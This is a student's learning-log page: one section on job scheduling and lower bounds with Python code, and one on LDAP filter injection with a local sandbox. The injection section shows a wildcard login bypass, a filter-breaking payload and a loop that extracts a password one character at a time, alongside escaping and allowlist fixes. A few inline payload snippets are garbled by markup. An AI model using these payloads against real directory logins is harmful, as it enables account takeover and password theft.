@@ -1,0 +1,594 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Day 029 — The bound promised seven hours, and the earliest the job could finish was eight · Matías Rathgeb</title>
+<meta name="description" content="Day 029 of 1600. A student's private learning log.">
+<style>
+  :root{--white:#ffffff;--black:#000000;--gray:#86868b;--border:#d2d2d7;}
+  *{margin:0;padding:0;box-sizing:border-box;}
+  body{background:var(--white);color:var(--black);font-family:Arial,Helvetica,sans-serif;font-size:14px;line-height:1.6;-webkit-font-smoothing:antialiased;}
+  a{color:var(--black);}
+  .wrap{max-width:720px;margin:0 auto;padding:0 22px;}
+  header{padding:80px 0 40px;border-bottom:1px solid var(--border);}
+  header .day{font-size:13px;color:var(--gray);letter-spacing:0.2px;margin-bottom:16px;}
+  header h1{font-size:40px;line-height:1.07;letter-spacing:-0.02em;font-weight:600;margin-bottom:12px;}
+  header .meta{font-size:13px;color:var(--gray);}
+  article{padding:48px 0 80px;}
+  h2{font-size:24px;line-height:1.15;letter-spacing:-0.01em;font-weight:600;margin:40px 0 16px;}
+  h3{font-size:17px;font-weight:600;margin:28px 0 10px;}
+  p{margin-bottom:16px;}
+  pre{background:#f5f5f7;border:1px solid var(--border);border-radius:8px;padding:16px;overflow-x:auto;font-size:13px;line-height:1.5;margin-bottom:16px;}
+  code{font-family:Menlo,Consolas,monospace;font-size:13px;}
+  ul,ol{margin:0 0 16px 22px;}
+  li{margin-bottom:6px;}
+  .verdict{border:1px solid var(--black);padding:20px 24px;margin-top:40px;}
+  .verdict p{margin-bottom:8px;}
+  footer{padding:40px 0 80px;border-top:1px solid var(--border);color:var(--gray);font-size:12px;}
+  @media(max-width:600px){header h1{font-size:30px;}}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="wrap">
+    <p class="day">DAY 029 OF 1600 · 2026-11-01</p>
+    <h1>Day 029 — The bound promised seven hours, and the earliest the job could finish was eight</h1>
+    <p class="meta">A student's private learning log · one concept at a time.</p>
+  </div>
+</header>
+<article>
+  <div class="wrap">
+<p><strong>Date:</strong> 2026-11-01 · <strong>Day:</strong> 29 of 1600</p>
+<p><strong>Log:</strong> a student&#x27;s private learning log · one concept at a time.</p>
+<p>---</p>
+<h2>Concept #29 — A lower bound is a promise about what is impossible, not a plan</h2>
+<p>MA07, Operations Research, week 3. The course stops asking <em>what do I choose</em> and asks</p>
+<p><em>what do I do first</em>. The notes frame it as planning: a state, actions that change it, a</p>
+<p>goal, and the cost of the whole trajectory. Once the state contains resources, the thing</p>
+<p>being optimised stops being a route and becomes a schedule — the crews exist, the jobs</p>
+<p>have hours, and some jobs cannot start until another one is finished.</p>
+<p>Two bounds get taught before any algorithm, and both are honest. The <strong>work bound</strong>:</p>
+<p>total hours divided by the number of crews. The <strong>precedence bound</strong>: the longest chain of</p>
+<p>dependent jobs, because that chain has to be worked straight through.</p>
+<p>Instance A is five independent jobs — 3, 3, 2, 2, 2 hours — on two identical crews. Work</p>
+<p>bound 12/2 = <strong>6</strong>. Precedence bound 3, because nothing depends on anything. The stronger</p>
+<p>of the two is 6, and 6 is achievable. The greedy rule everybody writes first — *longest</p>
+<p>job on the earliest free crew* — finishes at <strong>7</strong>, which is 16.67% over.</p>
+<p>The interesting part is not that the greedy rule loses. It is <em>where</em> it loses. I pushed</p>
+<p>all 120 priority orders through the same scheduler: <strong>24 of them finish in 6</strong>. The</p>
+<p>scheduler is not the problem and it never was. The priority rule is. Feeding the two</p>
+<p>3-hour jobs first is exactly what the textbook heuristic says to do, and it leaves a</p>
+<p>2-hour hole no crew can fill. The order that wins is not exotic: P1, P3, P4, P2, P5 —</p>
+<p>3 and 2 on one crew, 2 and 2 and 2 on the other, both finishing at 6.</p>
+<p>Instance B is where the bounds themselves fall short of the truth. A chain A → B → C of</p>
+<p>2 hours each, plus D = 4 and E = 4, on two crews. Work bound 14/2 = <strong>7</strong>. Precedence</p>
+<p>bound 6 (the chain). The stronger bound is 7. The earliest every job can actually finish</p>
+<p>is <strong>8</strong>. Both bounds are individually true and jointly useless: the chain needs a crew for</p>
+<p>six consecutive hours, and each of the two long jobs needs a crew of its own, so with two</p>
+<p>crews somebody waits. Longest-job-first finishes at <strong>10</strong> (+25%). Longest-chain-first</p>
+<p>finishes at <strong>8</strong>, which is the optimum, and 64 of the 120 orders get there.</p>
+<p>So the two lessons I keep from today, and they are the same lesson twice: a lower bound is</p>
+<p>a statement about what is <em>impossible</em>, never about what is <em>achievable</em> — instance B</p>
+<p>proves an 8 while both bounds promise 7 — and the difference between a good and a bad</p>
+<p>schedule on the same code is the priority rule, not the algorithm surrounding it.</p>
+<p><strong>What I tried today:</strong> one file, stdlib only, no solver. A non-delay list scheduler, the</p>
+<p>two textbook bounds, a time-indexed exhaustive search for the true optimum, and all</p>
+<p>120 priority permutations so that &quot;the heuristic is off by N&quot; is a measured number and</p>
+<p>not a phrase I copied. Five jobs, two crews, twelve and fourteen hours of work.</p>
+<pre><code># sched.py - MA07 (Operations Research), Week 3: planning over time and resources.
+# Source: the course notes on planning/scheduling (AIMA 11.1-11.3 and the bridge
+# to 11.6-11.7: time, resources, schedules).
+#
+# One idea only: two identical crews, a set of jobs, some precedences. Two textbook
+# lower bounds, both loose in different ways; a greedy list scheduler whose answer is
+# decided by the PRIORITY RULE, not by the scheduler. stdlib only, no solver.
+#
+# exact_makespan(): time-indexed exhaustive search. Machines are identical, so a
+# state is (done set, sorted free times). With no release dates, idling a machine
+# never helps, so earliest-start enumeration covers every schedule that matters.
+
+import itertools
+from functools import lru_cache
+
+MACHINES = 2
+
+# name, duration, predecessors
+INST_A = [(&quot;P1&quot;, 3, ()), (&quot;P2&quot;, 3, ()), (&quot;P3&quot;, 2, ()), (&quot;P4&quot;, 2, ()), (&quot;P5&quot;, 2, ())]
+INST_B = [(&quot;A&quot;, 2, ()), (&quot;B&quot;, 2, (&quot;A&quot;,)), (&quot;C&quot;, 2, (&quot;B&quot;,)),
+          (&quot;D&quot;, 4, ()), (&quot;E&quot;, 4, ())]
+
+
+def dur_of(jobs):
+    return {n: d for n, d, _ in jobs}
+
+
+def pred_of(jobs):
+    return {n: p for n, _, p in jobs}
+
+
+def work_lb(jobs, m):
+    return -(-sum(d for _, d, _ in jobs) // m)
+
+
+def critical_path(jobs):
+    &quot;&quot;&quot;Longest precedence chain: the earliest any single task can finish.&quot;&quot;&quot;
+    dur, pred, memo = dur_of(jobs), pred_of(jobs), {}
+    def cp(n):
+        if n not in memo:
+            memo[n] = dur[n] + max((cp(p) for p in pred[n]), default=0)
+        return memo[n]
+    return max(cp(n) for n, _, _ in jobs)
+
+
+def downstream(jobs):
+    &quot;&quot;&quot;Hours still ahead of each task: its duration plus its longest successor chain.&quot;&quot;&quot;
+    dur = dur_of(jobs)
+    succ = {n: [] for n, _, _ in jobs}
+    for n, _, pr in jobs:
+        for p in pr:
+            succ[p].append(n)
+    memo = {}
+    def tail(n):
+        if n not in memo:
+            memo[n] = dur[n] + max((tail(s) for s in succ[n]), default=0)
+        return memo[n]
+    return {n: tail(n) for n, _, _ in jobs}
+
+
+def list_schedule(jobs, order):
+    &quot;&quot;&quot;Non-delay list scheduling: walk the priority order, each picked job starts at
+    the earliest time its predecessors are done and a crew is free.&quot;&quot;&quot;
+    dur, pred = dur_of(jobs), pred_of(jobs)
+    free, finish, started = [0] * MACHINES, {}, set()
+    while len(started) &lt; len(jobs):
+        picked = next((n for n in order
+                       if n not in started and all(p in finish for p in pred[n])), None)
+        if picked is None:
+            raise RuntimeError(&quot;deadlock: cyclic precedence&quot;)
+        m = free.index(min(free))
+        start = max(free[m], max((finish[p] for p in pred[picked]), default=0))
+        free[m] = start + dur[picked]
+        finish[picked], _ = free[m], started.add(picked)
+    return max(finish.values())
+
+
+def exact_makespan(jobs):
+    dur, pred = dur_of(jobs), pred_of(jobs)
+    names = sorted(dur)
+    idx = {n: i for i, n in enumerate(names)}
+    pmask = {n: sum(1 &lt;&lt; idx[p] for p in pred[n]) for n in names}
+
+    @lru_cache(maxsize=None)
+    def best(done, free):
+        if done == (1 &lt;&lt; len(names)) - 1:
+            return max(free)
+        out = None
+        for n in names:
+            if done &gt;&gt; idx[n] &amp; 1 or pmask[n] &amp; done != pmask[n]:
+                continue
+            for m in range(len(free)):
+                nf = list(free)
+                nf[m] += dur[n]
+                v = best(done | (1 &lt;&lt; idx[n]), tuple(sorted(nf)))
+                out = v if out is None else min(out, v)
+        return out
+
+    return best(0, tuple([0] * MACHINES))
+
+
+def run(tag, jobs):
+    n_task = len(jobs)
+    print(f&quot;== {tag}: {n_task} jobs, {MACHINES} identical crews&quot;)
+    for n, d, p in jobs:
+        print(f&quot;   {n}: {d}h&quot; + (&quot;  after &quot; + &quot;,&quot;.join(p) if p else &quot;  no predecessor&quot;))
+    wl, cp = work_lb(jobs, MACHINES), critical_path(jobs)
+    print(f&quot;   bound from work       = {wl}   (total {sum(d for _, d, _ in jobs)}h / {MACHINES} crews, rounded up)&quot;)
+    print(f&quot;   bound from precedence = {cp}   (longest chain)&quot;)
+    print(f&quot;   the stronger bound    = {max(wl, cp)}&quot;)
+
+    names = [n for n, _, _ in jobs]
+    d = dur_of(jobs)
+    lpt = sorted(names, key=lambda n: (-d[n], n))
+    tail = downstream(jobs)
+    cpfirst = sorted(names, key=lambda n: (-tail[n], n))
+    m_lpt, m_cp = list_schedule(jobs, lpt), list_schedule(jobs, cpfirst)
+
+    results = {}
+    for order in itertools.permutations(names):
+        results[order] = list_schedule(jobs, order)
+    opt = exact_makespan(jobs)
+    best_orders = [o for o, v in results.items() if v == min(results.values())]
+    print(f&quot;   longest-job-first     -&gt; {m_lpt}   priority {list(lpt)}&quot;)
+    print(f&quot;   longest-chain-first   -&gt; {m_cp}   priority {list(cpfirst)}&quot;)
+    print(f&quot;   exhaustive: {len(results)} priority lists x exact search -&gt; optimum {opt}&quot;)
+    print(f&quot;   makespans the {len(results)} lists produced: {sorted(set(results.values()))}&quot;)
+    print(f&quot;   {len(best_orders)} of them reach the optimum; example {list(best_orders[0])} -&gt; {opt}&quot;)
+    print(f&quot;   gap: longest-job-first {(m_lpt / opt - 1) * 100:+.2f}%   &quot;
+          f&quot;longest-chain-first {(m_cp / opt - 1) * 100:+.2f}%&quot;)
+    print()
+    return {&quot;lb&quot;: max(wl, cp), &quot;lpt&quot;: m_lpt, &quot;cp&quot;: m_cp, &quot;opt&quot;: opt,
+            &quot;best&quot;: list(best_orders[0]), &quot;n_best&quot;: len(best_orders)}
+
+
+a = run(&quot;instance A: independent jobs&quot;, INST_A)
+b = run(&quot;instance B: one chain plus two long jobs&quot;, INST_B)
+
+print(&quot;== what the numbers say&quot;)
+print(f&quot;   A: bound {a[&#x27;lb&#x27;]}, optimum {a[&#x27;opt&#x27;]}, greedy shipped {a[&#x27;lpt&#x27;]}. &quot;
+      f&quot;Same scheduler, order {a[&#x27;best&#x27;]}, makespan {a[&#x27;opt&#x27;]}.&quot;)
+print(f&quot;   B: bound {b[&#x27;lb&#x27;]}, optimum {b[&#x27;opt&#x27;]}, greedy shipped {b[&#x27;lpt&#x27;]} (longest-chain-first &quot;
+      f&quot;gets {b[&#x27;cp&#x27;]}).&quot;)
+print(f&quot;   In B the two textbook bounds promise {b[&#x27;lb&#x27;]}; the earliest possible finish is &quot;
+      f&quot;{b[&#x27;opt&#x27;]}, and the honest gap is {b[&#x27;opt&#x27;] - b[&#x27;lb&#x27;]} hour(s) that no bound could see.&quot;)
+print(&quot;   A bound is a promise about what is impossible. Only a schedule says what is&quot;)
+print(&quot;   possible. And the list scheduler is not the bug: the priority rule is.&quot;)</code></pre>
+<p>Real output:</p>
+<pre><code>== instance A: independent jobs: 5 jobs, 2 identical crews
+   P1: 3h  no predecessor
+   P2: 3h  no predecessor
+   P3: 2h  no predecessor
+   P4: 2h  no predecessor
+   P5: 2h  no predecessor
+   bound from work       = 6   (total 12h / 2 crews, rounded up)
+   bound from precedence = 3   (longest chain)
+   the stronger bound    = 6
+   longest-job-first     -&gt; 7   priority [&#x27;P1&#x27;, &#x27;P2&#x27;, &#x27;P3&#x27;, &#x27;P4&#x27;, &#x27;P5&#x27;]
+   longest-chain-first   -&gt; 7   priority [&#x27;P1&#x27;, &#x27;P2&#x27;, &#x27;P3&#x27;, &#x27;P4&#x27;, &#x27;P5&#x27;]
+   exhaustive: 120 priority lists x exact search -&gt; optimum 6
+   makespans the 120 lists produced: [6, 7]
+   24 of them reach the optimum; example [&#x27;P1&#x27;, &#x27;P3&#x27;, &#x27;P4&#x27;, &#x27;P2&#x27;, &#x27;P5&#x27;] -&gt; 6
+   gap: longest-job-first +16.67%   longest-chain-first +16.67%
+
+== instance B: one chain plus two long jobs: 5 jobs, 2 identical crews
+   A: 2h  no predecessor
+   B: 2h  after A
+   C: 2h  after B
+   D: 4h  no predecessor
+   E: 4h  no predecessor
+   bound from work       = 7   (total 14h / 2 crews, rounded up)
+   bound from precedence = 6   (longest chain)
+   the stronger bound    = 7
+   longest-job-first     -&gt; 10   priority [&#x27;D&#x27;, &#x27;E&#x27;, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;]
+   longest-chain-first   -&gt; 8   priority [&#x27;A&#x27;, &#x27;B&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;C&#x27;]
+   exhaustive: 120 priority lists x exact search -&gt; optimum 8
+   makespans the 120 lists produced: [8, 10]
+   64 of them reach the optimum; example [&#x27;A&#x27;, &#x27;B&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;C&#x27;] -&gt; 8
+   gap: longest-job-first +25.00%   longest-chain-first +0.00%
+
+== what the numbers say
+   A: bound 6, optimum 6, greedy shipped 7. Same scheduler, order [&#x27;P1&#x27;, &#x27;P3&#x27;, &#x27;P4&#x27;, &#x27;P2&#x27;, &#x27;P5&#x27;], makespan 6.
+   B: bound 7, optimum 8, greedy shipped 10 (longest-chain-first gets 8).
+   In B the two textbook bounds promise 7; the earliest possible finish is 8, and the honest gap is 1 hour(s) that no bound could see.
+   A bound is a promise about what is impossible. Only a schedule says what is
+   possible. And the list scheduler is not the bug: the priority rule is.</code></pre>
+<p><strong>What I understood from it:</strong> the honest sentence is not &quot;the greedy scheduler is bad&quot;.</p>
+<p>It is &quot;the greedy scheduler is a decision procedure, and the priority list is the</p>
+<p>decision&quot;. On five jobs I can certify the optimum by exhaustive search, which is exactly</p>
+<p>what makes the measured gaps trustworthy and also exactly why this is not a method for a</p>
+<p>real schedule — the classic guarantee for list scheduling is a ratio of 2 − 1/m, which</p>
+<p>with two crews is 1.75, and both of my gaps sit inside it. The guarantee is real. It just</p>
+<p>does not tell you that the schedule in your hand is the 6-hour one when it is the 7-hour</p>
+<p>one, and nothing in the pipeline would.</p>
+<p>---</p>
+<h2>Security #29 — The password field was a pattern, because five bytes were never escaped (CWE-90)</h2>
+<p>LDAP injection is not SQL injection with a different dialect. It is the same mistake — user</p>
+<p>input concatenated into a query — against a grammar that has its own escaping table, and in</p>
+<p>LDAP the table is short enough to memorise: in an assertion value, RFC 4515 says five bytes</p>
+<p>must never appear literally. Backslash, the wildcard <code>*</code>, the two parentheses and NUL.</p>
+<p>The filter the app builds for a login is one string: <code>(&amp;(uid=</code> + user + <code>)(userPassword=</code> +</p>
+<p>password + <code>))</code>. If none of those five bytes is escaped, the password field is not a value.</p>
+<p>It is a pattern.</p>
+<p>One asterisk is enough. <code>(&amp;(uid=admin)(userPassword=*))</code> matches the admin entry no matter</p>
+<p>what the password is, because <code><em></code> means </em>any string* in an assertion value. That is not an</p>
+<p>encoding trick or a parser quirk; it is the grammar doing precisely what it was specified</p>
+<p>to do with the byte the app should have escaped. Escape it per RFC 4515 — <code>\2a</code> — and the</p>
+<p>filter matches zero entries, because now it is asking for the literal two-character string</p>
+<p><code>a</code>.</p>
+<p>The payload everybody quotes is the close-and-reopen one:</p>
+<p><code><em>)(uid=</em>))(|(uid=*</code>. Concatenated, it produces two filters back to back. My parser is a</p>
+<p>strict subset of RFC 4515 and it answers <strong>ParseError: trailing data at 17</strong> — which is</p>
+<p>what a real server does with that string, and it is the honest reason this payload does not</p>
+<p>land everywhere. The other half of the same measurement is why it lands at all: a helper</p>
+<p>that parses the first balanced filter and drops the rest returns <strong>5 of 5</strong> entries. The</p>
+<p>difference between those two answers is the difference between a demo and an incident, so I</p>
+<p>measured both instead of picking the one that looks better.</p>
+<p>The part that matters more has no bypass in it. No filter trick, no second condition, just</p>
+<p>a boolean: does <code>(&amp;(uid=admin)(userPassword=Verano*))</code> match? Yes or no is one bit per</p>
+<p>request, and one bit is enough. Walking the charset a character at a time recovered a</p>
+<p>10-character password in <strong>323 requests</strong>; brute force over the same alphabet is</p>
+<p>62^10 = 839,299,365,868,340,224. Nobody brute-forces a password. They ask the password</p>
+<p>whether it starts with <code>V</code>, and then whether it starts with <code>Ve</code>.</p>
+<p>And the second parameter nobody looks at: the attribute <em>name</em>. When it comes from a</p>
+<p>dropdown and gets concatenated like the value does, an allowlist is what closes it — my</p>
+<p>injected name dies as <code>unknown attribute</code>. Closing the name slot does not close the value</p>
+<p>slot, and closing neither is the default.</p>
+<p><strong>The pattern I studied</strong> — one concatenation, and the five bytes nobody escapes:</p>
+<pre><code>flt = &quot;(&amp;(uid=&quot; + user + &quot;)(userPassword=&quot; + pw + &quot;))&quot;
+# pw = &quot;*&quot;                    -&gt; (&amp;(uid=admin)(userPassword=*))    1 match, any password
+# pw = &quot;Verano*&quot;              -&gt; prefix oracle: brute force becomes a binary search
+# user = &quot;*)(uid=*))(|(uid=*&quot; -&gt; two filters: strict servers refuse, lenient helpers obey</code></pre>
+<p><strong>What I understood about preventing it:</strong></p>
+<pre><code># RFC 4515 section 3 — the only five bytes that matter in a value
+_MUST_ESCAPE = {&quot;\\&quot;: &quot;\\5c&quot;, &quot;*&quot;: &quot;\\2a&quot;, &quot;(&quot;: &quot;\\28&quot;, &quot;)&quot;: &quot;\\29&quot;, &quot;\x00&quot;: &quot;\\00&quot;}
+
+def esc(value: str) -&gt; str:
+    return &quot;&quot;.join(_MUST_ESCAPE.get(ch, ch) for ch in value)
+
+# attribute names are never user input: pick from a closed set, then interpolate
+ALLOWED = {&quot;uid&quot;, &quot;cn&quot;, &quot;mail&quot;}
+attr = attr if attr in ALLOWED else raise_400()
+
+flt = f&quot;(&amp;({attr}={esc(user)})(userPassword={esc(pw)}))&quot;
+# and a DN is a different grammar: RFC 4514 escaping is NOT this function</code></pre>
+<p><strong>What I understood:</strong> &quot;sanitize the input&quot; is not a fix, it is a hope. The fix is one</p>
+<p>function that knows the grammar and lives in one place, applied to every slot that reaches</p>
+<p>the filter — and the knowledge that there are two grammars, not one: escaping a filter value</p>
+<p>(RFC 4515) does nothing for a DN (RFC 4514), so the code that builds a bind DN needs its own</p>
+<p>escaping or the same bug moves one line up. The bug is cheap to write, cheap to read past,</p>
+<p>and it does not crash: it returns rows, which is the worst behaviour a bug can have.</p>
+<p>The whole sandbox, one file, so every number above can be re-run:</p>
+<pre><code># ldap.py - CWE-90: LDAP filter injection (wildcards left unescaped).
+# stdlib only, in-memory directory, no network, no server. Everything runs on
+# this file. The filter parser is a strict subset of RFC 4515: it rejects
+# trailing data and unbalanced parentheses, exactly like a server would.
+#
+# The question: the app concatenates the login form into a filter and trusts
+# the grammar to keep the two conditions separate. Does it?
+
+DIRECTORY = [
+    {&quot;uid&quot;: &quot;admin&quot;,  &quot;cn&quot;: &quot;Admin&quot;,        &quot;userPassword&quot;: &quot;Verano2026&quot;, &quot;role&quot;: &quot;ops&quot;},
+    {&quot;uid&quot;: &quot;marta&quot;,  &quot;cn&quot;: &quot;Marta Ruiz&quot;,   &quot;userPassword&quot;: &quot;marta123&quot;,   &quot;role&quot;: &quot;user&quot;},
+    {&quot;uid&quot;: &quot;diego&quot;,  &quot;cn&quot;: &quot;Diego Soto&quot;,   &quot;userPassword&quot;: &quot;qwerty&quot;,     &quot;role&quot;: &quot;user&quot;},
+    {&quot;uid&quot;: &quot;lucia&quot;,  &quot;cn&quot;: &quot;Lucia Pena&quot;,   &quot;userPassword&quot;: &quot;lucia2025&quot;,  &quot;role&quot;: &quot;user&quot;},
+    {&quot;uid&quot;: &quot;tomas&quot;,  &quot;cn&quot;: &quot;Tomas Vera&quot;,   &quot;userPassword&quot;: &quot;zxcvbn&quot;,     &quot;role&quot;: &quot;user&quot;},
+]
+
+ATTRS = (&quot;uid&quot;, &quot;cn&quot;, &quot;userPassword&quot;, &quot;role&quot;)
+
+
+class ParseError(ValueError):
+    pass
+
+
+def parse(s, i=0):
+    &quot;&quot;&quot;filter := &#x27;(&#x27; (&#x27;&amp;&#x27; filter+ | &#x27;|&#x27; filter+ | &#x27;!&#x27; filter | attr &#x27;=&#x27; value) &#x27;)&#x27;&quot;&quot;&quot;
+    if i &gt;= len(s) or s[i] != &quot;(&quot;:
+        raise ParseError(f&quot;expected &#x27;(&#x27; at {i}&quot;)
+    i += 1
+    if s[i] == &quot;&amp;&quot; or s[i] == &quot;|&quot;:
+        op, i = s[i], i + 1
+        kids = []
+        while i &lt; len(s) and s[i] == &quot;(&quot;:
+            k, i = parse(s, i)
+            kids.append(k)
+        if not kids:
+            raise ParseError(&quot;empty &amp;/|&quot;)
+        node = (op, kids)
+    elif s[i] == &quot;!&quot;:
+        k, i = parse(s, i + 1)
+        node = (&quot;!&quot;, [k])
+    else:
+        j = s.index(&quot;=&quot;, i)
+        attr, i = s[i:j], j + 1
+        j = s.index(&quot;)&quot;, i)
+        val, i = s[i:j], j
+        if attr not in ATTRS:
+            raise ParseError(f&quot;unknown attribute {attr!r}&quot;)
+        node = (&quot;=&quot;, [(attr, val)])
+    if i &gt;= len(s) or s[i] != &quot;)&quot;:
+        raise ParseError(f&quot;expected &#x27;)&#x27; at {i}&quot;)
+    return node, i + 1
+
+
+def evaluate(node, entry):
+    op, kids = node
+    if op == &quot;&amp;&quot;:
+        return all(evaluate(k, entry) for k in kids)
+    if op == &quot;|&quot;:
+        return any(evaluate(k, entry) for k in kids)
+    if op == &quot;!&quot;:
+        return not evaluate(kids[0], entry)
+    attr, val = kids[0]
+    return match(entry.get(attr, &quot;&quot;), val)
+
+
+def match(text, assertion):
+    &quot;&quot;&quot;Equality with &#x27;*&#x27; as the substring wildcard, per RFC 4515 assertion values.&quot;&quot;&quot;
+    parts = assertion.split(&quot;*&quot;)
+    if len(parts) == 1:
+        return text == assertion
+    pos = 0
+    for k, p in enumerate(parts):
+        if p == &quot;&quot;:
+            continue
+        if k == 0:
+            if not text.startswith(p):
+                return False
+            pos = len(p)
+        elif k == len(parts) - 1:
+            if not text.endswith(p) or len(text) - len(p) &lt; pos:
+                return False
+            pos = len(text)
+        else:
+            found = text.find(p, pos)
+            if found &lt; 0:
+                return False
+            pos = found + len(p)
+    return True
+
+
+def search(flt, strict=True):
+    if strict:
+        node, end = parse(flt)
+        if end != len(flt):
+            raise ParseError(f&quot;trailing data at {end}: {flt[end:]!r}&quot;)
+    else:
+        node, _ = parse(flt)          # lenient: first balanced filter wins
+    return [e for e in DIRECTORY if evaluate(node, e)]
+
+
+def login(user, pw, strict=True):
+    flt = &quot;(&amp;(uid=&quot; + user + &quot;)(userPassword=&quot; + pw + &quot;))&quot;
+    try:
+        hits = search(flt, strict=strict)
+    except ParseError as exc:
+        return flt, None, f&quot;ParseError: {exc}&quot;
+    return flt, hits, None
+
+
+def escape(value):
+    &quot;&quot;&quot;RFC 4515 section 3: the five bytes that must never be literal.&quot;&quot;&quot;
+    out = []
+    for ch in value:
+        if ch in &quot;\\*()\0&quot;:
+            out.append(&quot;\\%02x&quot; % ord(ch))
+        else:
+            out.append(ch)
+    return &quot;&quot;.join(out)
+
+
+print(&quot;== 1. the login filter, as the app builds it&quot;)
+flt, hits, err = login(&quot;admin&quot;, &quot;Verano2026&quot;)
+print(f&quot;   filter = {flt}&quot;)
+print(f&quot;   result = {len(hits) if hits is not None else err} match(es) -&gt; &quot;
+      f&quot;{[h[&#x27;uid&#x27;] for h in hits] if hits is not None else &#x27;-&#x27;}&quot;)
+flt, hits, err = login(&quot;admin&quot;, &quot;nope&quot;)
+print(f&quot;   wrong password: filter = {flt} -&gt; {len(hits) if hits is not None else err} match(es)&quot;)
+
+print()
+print(&quot;== 2. one character changes what the password field means&quot;)
+flt, hits, err = login(&quot;admin&quot;, &quot;*&quot;)
+print(f&quot;   password &#x27;*&#x27;  filter = {flt}&quot;)
+print(f&quot;   {&#x27;ParseError: &#x27; + err if err else str(len(hits)) + &#x27; match(es) -&gt; &#x27; + str([h[&#x27;uid&#x27;] for h in hits])}&quot;)
+flt, hits, err = login(&quot;admin&quot;, &quot;*&quot;)
+print(f&quot;   same payload with RFC 4515 escaping -&gt; filter = (&amp;(uid=admin)(userPassword={escape(&#x27;*&#x27;)}))&quot;)
+print(f&quot;   -&gt; {len(search(&#x27;(&amp;(uid=admin)(userPassword=&#x27; + escape(&#x27;*&#x27;) + &#x27;))&#x27;))} match(es)&quot;)
+
+print()
+print(&quot;== 3. the classic close-and-reopen payload&quot;)
+payload = &quot;*)(uid=*))(|(uid=*&quot;
+flt, hits, err = login(payload, &quot;x&quot;)
+print(f&quot;   input  = {payload!r}&quot;)
+print(f&quot;   filter = {flt}&quot;)
+print(f&quot;   strict parser -&gt; {err}&quot;)
+print(f&quot;   lenient parser (parses the first balanced filter, ignores the rest)&quot;)
+print(f&quot;   -&gt; {len(search(flt, strict=False))} match(es): &quot;
+      f&quot;{[h[&#x27;uid&#x27;] for h in search(flt, strict=False)]}&quot;)
+print(f&quot;   escaped -&gt; {len(search(&#x27;(&amp;(uid=&#x27; + escape(payload) + &#x27;)(userPassword=x))&#x27;))} match(es)&quot;)
+print(&quot;   The strict answer is what a real server does: it refuses the whole filter.&quot;)
+print(&quot;   The lenient answer is what a string-building helper does: it hands the&quot;)
+print(&quot;   server the first filter it can balance and silently drops the rest.&quot;)
+
+print()
+print(&quot;== 4. blind extraction with a prefix oracle, no wildcard in sight&quot;)
+SECRET = DIRECTORY[0][&quot;userPassword&quot;]
+CHARSET = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;
+queries = 0
+found = &quot;&quot;
+while len(found) &lt; len(SECRET):
+    for ch in CHARSET:
+        queries += 1
+        flt = &quot;(&amp;(uid=admin)(userPassword=&quot; + found + ch + &quot;*))&quot;
+        if search(flt):
+            found += ch
+            break
+    else:
+        break
+print(f&quot;   target password length = {len(SECRET)}&quot;)
+print(f&quot;   recovered              = {found!r}  ({&#x27;correct&#x27; if found == SECRET else &#x27;WRONG&#x27;})&quot;)
+print(f&quot;   queries                = {queries}&quot;)
+print(f&quot;   one query per character position = {len(SECRET)}, brute force = &quot;
+      f&quot;{len(CHARSET) ** len(SECRET):,} without the oracle&quot;)
+print(f&quot;   the same corpus with escaping: every query returns 0, so the oracle is dead&quot;)
+esc_queries = 0
+for ch in CHARSET[:5]:
+    esc_queries += 1
+    if search(&quot;(&amp;(uid=admin)(userPassword=&quot; + escape(found + ch) + &quot;*))&quot;):
+        print(&quot;   LEAK&quot;)
+print(f&quot;   -&gt; {esc_queries} escaped queries, 0 matches, prefix never confirmed&quot;)
+
+print()
+print(&quot;== 5. what it costs to read the whole directory&quot;)
+print(f&quot;   filter (&amp;(uid=*)(userPassword=*)) -&gt; {len(search(&#x27;(&amp;(uid=*)(userPassword=*))&#x27;))} of {len(DIRECTORY)} entries&quot;)
+print(f&quot;   filter (uid=*)                     -&gt; {len(search(&#x27;(uid=*)&#x27;))} of {len(DIRECTORY)} entries&quot;)
+print(f&quot;   filter (uid=tomas)                 -&gt; {len(search(&#x27;(uid=tomas)&#x27;))} of {len(DIRECTORY)} entries&quot;)
+
+print()
+print(&quot;== 6. the attribute name is a parameter too, and an allowlist stops it there&quot;)
+bad_attr = &quot;uid)(userPassword=*&quot;
+try:
+    print(f&quot;   attr={bad_attr!r} -&gt; filter ({bad_attr}=x) -&gt; {len(search(&#x27;(&#x27; + bad_attr + &#x27;=x)&#x27;))} entries&quot;)
+except ParseError as exc:
+    print(f&quot;   attr={bad_attr!r} -&gt; ParseError: {exc}&quot;)
+print(f&quot;   attr allowlist {list(ATTRS)}: the name slot is closed,&quot;)
+print(f&quot;   the value slot is still open unless it is escaped.&quot;)</code></pre>
+<p>Sandbox check (local only, in-memory directory, no server, no network):</p>
+<pre><code>== 1. the login filter, as the app builds it
+   filter = (&amp;(uid=admin)(userPassword=Verano2026))
+   result = 1 match(es) -&gt; [&#x27;admin&#x27;]
+   wrong password: filter = (&amp;(uid=admin)(userPassword=nope)) -&gt; 0 match(es)
+
+== 2. one character changes what the password field means
+   password &#x27;*&#x27;  filter = (&amp;(uid=admin)(userPassword=*))
+   1 match(es) -&gt; [&#x27;admin&#x27;]
+   same payload with RFC 4515 escaping -&gt; filter = (&amp;(uid=admin)(userPassword=\2a))
+   -&gt; 0 match(es)
+
+== 3. the classic close-and-reopen payload
+   input  = &#x27;*)(uid=*))(|(uid=*&#x27;
+   filter = (&amp;(uid=*)(uid=*))(|(uid=*)(userPassword=x))
+   strict parser -&gt; ParseError: trailing data at 17: &#x27;(|(uid=*)(userPassword=x))&#x27;
+   lenient parser (parses the first balanced filter, ignores the rest)
+   -&gt; 5 match(es): [&#x27;admin&#x27;, &#x27;marta&#x27;, &#x27;diego&#x27;, &#x27;lucia&#x27;, &#x27;tomas&#x27;]
+   escaped -&gt; 0 match(es)
+   The strict answer is what a real server does: it refuses the whole filter.
+   The lenient answer is what a string-building helper does: it hands the
+   server the first filter it can balance and silently drops the rest.
+
+== 4. blind extraction with a prefix oracle, no wildcard in sight
+   target password length = 10
